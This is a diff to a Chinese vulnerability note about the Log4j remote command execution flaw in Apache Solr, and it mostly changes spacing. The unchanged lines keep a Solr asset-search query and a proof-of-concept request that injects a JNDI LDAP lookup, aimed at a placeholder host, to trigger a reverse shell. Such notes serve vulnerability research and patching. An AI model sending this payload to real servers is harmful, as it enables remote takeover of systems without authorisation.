@@ -1,8 +1,8 @@
-# Apache Solr Log4j组件 远程命令执行漏洞
+# Apache Solr Log4j 组件 远程命令执行漏洞 
 
 ## 漏洞描述
 
-Apache Solr Log4j组件 远程命令执行漏洞，详情略
+Apache Solr Log4j 组件 远程命令执行漏洞，详情略
 
 ## 漏洞影响
 
@@ -22,7 +22,7 @@ app="APACHE-Solr"
 
 ![](images/202205251622273.png)
 
-验证POC
+验证 POC
 
 ```
 /solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
